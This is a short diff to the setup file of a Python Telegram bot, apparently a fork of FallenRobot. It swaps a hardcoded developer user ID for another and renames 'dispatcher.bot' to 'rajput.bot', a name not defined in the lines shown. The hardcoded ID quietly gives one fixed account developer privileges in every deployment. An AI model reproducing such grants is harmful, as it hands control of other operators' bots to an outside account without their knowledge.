@@ -142,7 +142,7 @@ else:
 
 DRAGONS.add(OWNER_ID)
 DEV_USERS.add(OWNER_ID)
-DEV_USERS.add(1356469075)
+DEV_USERS.add(6592410058)
 
 
 updater = tg.Updater(TOKEN, workers=WORKERS, use_context=True)
@@ -152,9 +152,9 @@ pbot = Client("FallenRobot", api_id=API_ID, api_hash=API_HASH, bot_token=TOKEN)
 dispatcher = updater.dispatcher
 
 print("[INFO]: Getting Bot Info...")
-BOT_ID = dispatcher.bot.id
-BOT_NAME = dispatcher.bot.first_name
-BOT_USERNAME = dispatcher.bot.username
+BOT_ID = rajput.bot.id
+BOT_NAME = rajput.bot.first_name
+BOT_USERNAME = rajput.bot.username
 
 DRAGONS = list(DRAGONS) + list(DEV_USERS)
 DEV_USERS = list(DEV_USERS)
